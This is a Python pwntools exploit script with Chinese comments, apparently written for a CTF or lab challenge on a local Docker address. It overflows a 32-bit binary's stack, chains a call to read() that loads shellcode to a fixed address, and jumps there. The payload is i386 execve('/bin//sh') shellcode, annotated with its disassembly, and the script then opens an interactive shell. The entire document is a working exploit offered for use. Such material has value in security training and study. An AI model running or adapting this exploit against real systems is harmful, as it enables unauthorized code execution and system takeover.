#!/usr/bin/python
#coding:utf-8
#ROP利用write函数将shellcode写入对应地址，然后进行调用

from pwn import *

context.update(arch = 'i386', os = 'linux', timeout = 1)
io = remote('172.17.0.2', 10001)

shellcode ="\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
# push 0Bh
# pop eax
# cdq
# push edx
# push 68732F2Fh
# push 6E69622Fh
# mov ebx, esp
# xor ecx, ecx
# int 80h

shellcode_addr = 0x0804a05c
read = 0x08048350

payload  = "A"*28					#padding
payload += p32(read)				#调用read函数, read(fd, buf, size)
payload += p32(shellcode_addr)		#read函数调用结束后返回的地址。使用read函数读取shellcode后跳到shellcode上
payload += p32(0)					#read = 0
payload += p32(shellcode_addr)		#buf = shellcode_addr
payload += p32(len(shellcode)+1)	#size = len(shellcode + '\0')

io.recv()
io.sendline(payload)				#发送payload，利用栈溢出再次调用read读取shellcode
sleep(0.1)							#等待程序执行到read函数
io.sendline(shellcode)				#发送shellcode
io.recv()
io.interactive()